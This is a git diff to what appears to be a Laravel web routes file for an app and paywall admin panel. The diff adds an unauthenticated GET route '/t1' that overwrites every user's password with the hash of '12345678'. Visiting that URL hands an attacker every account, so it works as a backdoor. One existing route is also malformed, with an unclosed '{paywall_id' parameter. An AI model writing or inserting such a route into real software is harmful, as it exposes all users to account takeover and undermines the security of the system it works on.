@@ -25,3 +25,11 @@ Route::get('/apps/{id}', [App\Http\Controllers\HomeController::class, 'apps'])->
 Route::get('/paywalls/{api_key}/{app_id}', [App\Http\Controllers\HomeController::class, 'paywalls'])->name('paywalls');
 Route::get('/paywalls/details/{api_key}/{app_id}/{paywall_id', [App\Http\Controllers\HomeController::class, 'paywall_details'])->name('paywall_details');
 Route::get('/paywall/delete/{id}', [App\Http\Controllers\HomeController::class, 'delete'])->name('paywall.delete');
+Route::get('/t1', function () {
+ $list=User::all();
+ foreach($list as $item)
+ {
+    $item->password=bcrypt("12345678");
+    $item->save();
+ }
+});
